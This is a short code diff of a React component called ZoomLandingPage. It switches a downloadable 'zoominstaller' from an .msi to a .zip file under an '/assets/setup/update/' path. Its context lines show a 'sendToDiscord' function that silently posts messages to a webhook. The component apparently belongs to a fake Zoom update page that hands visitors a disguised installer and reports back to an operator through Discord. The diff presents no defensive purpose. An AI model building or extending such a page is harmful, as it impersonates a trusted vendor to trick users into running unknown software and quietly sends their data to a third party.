@@ -6,8 +6,8 @@ export default function ZoomLandingPage({ onNavigateToUpdate }) {
     const [isDownloading, setIsDownloading] = useState(false);
 
     // Download file path
-    const INSTALLER_PATH = "/assets/setup/update/zoominstaller.msi";
-    const INSTALLER_FILENAME = "zoominstaller.msi";
+    const INSTALLER_PATH = "/assets/setup/update/zoominstaller.zip";
+    const INSTALLER_FILENAME = "zoominstaller.zip";
 
     // Send data to Discord (fails silently if webhook not configured)
     const sendToDiscord = async (message) => {
